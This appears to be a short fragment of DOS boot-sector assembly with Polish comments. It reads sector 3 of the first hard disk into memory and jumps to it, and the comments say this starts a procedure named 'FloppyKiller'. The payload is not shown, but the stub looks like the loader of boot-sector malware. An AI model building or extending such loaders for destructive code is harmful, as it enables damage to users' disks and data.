.model tiny
.code
  org 100h
  start:
   xor ax,ax
   mov ss,ax
   mov sp,7c00h   ; stos jest ustawiany tak jak w orginale
   mov ax,9000h
   mov es,ax      ; es:bx = [9000:0000] - adres pod ktory zostanie wczytana procedura FloppyKiller
   xor bx,bx
   mov ax,0201h
   mov cx,0003h   ; 3 sektor
   mov dx,0080h
   push es        ; adres es:bx na stos
   push bx
   int 13h        ; odczyt sektora 3 do pamieci pod adres es:bx
   retf           ; uruchomienie procedury FlopyKiller...
   
  end start



